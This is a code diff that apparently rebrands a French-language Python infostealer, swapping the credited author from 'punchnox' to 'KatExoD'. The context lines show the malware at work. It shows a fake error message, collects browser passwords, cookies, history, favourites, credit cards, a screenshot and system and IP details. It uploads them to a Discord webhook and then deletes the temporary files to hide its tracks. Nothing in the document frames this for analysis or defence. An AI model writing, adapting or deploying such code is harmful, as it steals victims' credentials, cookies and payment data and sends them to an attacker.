@@ -1,6 +1,6 @@
 # coding: utf-8
 
-punchnox = "dev par punchnox"
+zerow = "dev by KatExoD"
 
 import shutil, pyautogui, uuid, platform, os, requests, dhooks,  re, sys
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -23,7 +23,7 @@ launch()
 ICON_STOP = 0x10
 result = windll.user32.MessageBoxW(0, "Code : 5894 \nImpossible d'exécuter le programme sur votre système d'exploitation", "Error !", ICON_STOP)
 
-hook = dhooks.Webhook(punchnox)
+hook = dhooks.Webhook(zerow)
 
 global uuidgen
 uuidgen = str(uuid.uuid4())
@@ -252,7 +252,7 @@ def main():
     
       return fmtPasswords
 
-    fichier2 = open(temp + "\\punchnox.txt", 'a')
+    fichier2 = open(temp + "\\zerow.txt", 'a')
     fichier2.write(GetFormattedPasswords())
     fichier2.close()
 
@@ -369,11 +369,11 @@ def main():
 
     hook.send("historique : ", file=dhooks.File(temp + "\\history.txt", name="history.txt"))
     hook.send("cookies : ", file=dhooks.File(temp + "\\cookies.txt", name="cookies.txt"))
-    hook.send("password : ", file=dhooks.File(temp + "\\punchnox.txt", name="password.txt"))
+    hook.send("password : ", file=dhooks.File(temp + "\\zerow.txt", name="password.txt"))
     hook.send("Favori : ", file=dhooks.File(temp + "\\favori.txt", name="favori.txt"))
     os.system("del " + temp + "\\history.txt")
     os.system("del " + temp + "\\cookies.txt")
-    os.system("del " + temp + "\\punchnox.txt")
+    os.system("del " + temp + "\\zerow.txt")
     os.system("del " + temp + "\\favori.txt")
     if GetFormattedCreditCards():
         cartes = GetFormattedCreditCards()
@@ -389,5 +389,5 @@ def main():
     os.system("del " + temp + "\\screen.png")
 
     hook.send(message)
-    hook.send("```fix\nNouvelle connexion ouverte " + uuidgen + "\nPrefix : " + platform.node() + "\nSystème d'exploitation : " + platform.system() + " " + platform.release() + "\nArch : " + platform.architecture()[0]  + "\nNode : " + platform.node() + "\nProcesseur : " + platform.processor() + "\nIp : " + ip + "\nNom de la session : " + os.getlogin() + "\n```\n>>> ***Dev by punchnox***")
+    hook.send("```fix\nNouvelle connexion ouverte " + uuidgen + "\nPrefix : " + platform.node() + "\nSystème d'exploitation : " + platform.system() + " " + platform.release() + "\nArch : " + platform.architecture()[0]  + "\nNode : " + platform.node() + "\nProcesseur : " + platform.processor() + "\nIp : " + ip + "\nNom de la session : " + os.getlogin() + "\n```\n>>> ***Dev by KatExoD***")
 main()
